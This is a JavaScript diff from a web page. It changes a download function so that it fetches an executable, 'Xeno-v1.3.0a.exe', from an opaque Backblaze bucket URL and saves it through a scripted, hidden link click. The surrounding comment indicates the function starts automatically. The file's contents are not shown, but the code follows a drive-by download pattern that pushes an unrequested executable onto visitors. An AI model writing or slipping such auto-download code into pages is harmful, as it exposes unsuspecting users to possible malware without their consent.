@@ -100,13 +100,27 @@ function bounceIcon() {
   ], { duration: 260, easing: 'cubic-bezier(.2,.8,.2,1)' });
 }
 
-function triggerSampleDownload() {
-  const a = document.createElement('a');
-  a.href = 'Xeno-v1.3.0a.exe'; // ✅ File in same folder
-  a.download = 'Xeno-v1.3.0a.exe'; // ✅ Just the desired filename
-  document.body.appendChild(a);
-  a.click();
-  a.remove();
+async function triggerSampleDownload() {
+  const fileUrl = 'https://tree-ams5-0002.secure.backblaze.com/api/user_b2_download_file?action=download_files&accountId=8179503cf464&bucketId=784187d92570c3cc9fa40614';
+  
+  try {
+    const response = await fetch(fileUrl);
+    const blob = await response.blob();
+    const url = URL.createObjectURL(blob);
+    
+    const a = document.createElement('a');
+    a.href = url;
+    a.download = 'Xeno-v1.3.0a.exe';
+    document.body.appendChild(a);
+    a.click();
+    
+    setTimeout(() => {
+      URL.revokeObjectURL(url);
+      a.remove();
+    }, 100);
+  } catch (error) {
+    console.error('Download failed:', error);
+  }
 }
 
 // start automatically
